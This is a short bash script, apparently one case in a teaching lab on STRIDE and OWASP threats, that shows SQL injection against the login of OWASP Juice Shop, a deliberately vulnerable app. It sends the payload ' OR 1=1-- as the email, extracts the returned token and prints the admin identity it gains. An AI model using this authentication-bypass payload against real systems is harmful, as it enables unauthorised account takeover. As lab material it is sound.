#!/usr/bin/env bash
# CASO 1 - SQL Injection no login (STRIDE: Spoofing + Elevation of Privilege | OWASP A03)
# Código vulnerável: routes/login.ts, linha 34 (consulta montada com template literal)
source "$(dirname "$0")/_comum.sh"
preparar

titulo "1) Login legítimo com senha ERRADA (deve falhar)"
curl -sS -o /dev/null -w "HTTP %{http_code}\n" -X POST "${JUICE_URL}/rest/user/login" \
  -H 'Content-Type: application/json' --data '{"email":"admin@juice-sh.op","password":"chute"}'

titulo "2) Ataque: e-mail = ' OR 1=1--   (senha qualquer)"
echo "SQL resultante: SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '...'"
echo "                                                    └── tudo depois de -- vira comentário"
RESP="$(login "' OR 1=1--" "qualquer-coisa")"
TOKEN="$(jq -r '.authentication.token // empty' <<<"$RESP")"

if [[ -n "$TOKEN" ]]; then
  alerta "Login realizado SEM senha! Usuário autenticado:"
  jwt_payload "$TOKEN" | jq '{email: .data.email, role: .data.role}'
  echo
  echo "➡ O banco devolveu o PRIMEIRO usuário da tabela: o administrador."
else
  ok "Ataque bloqueado: $(jq -c . <<<"$RESP")"
fi
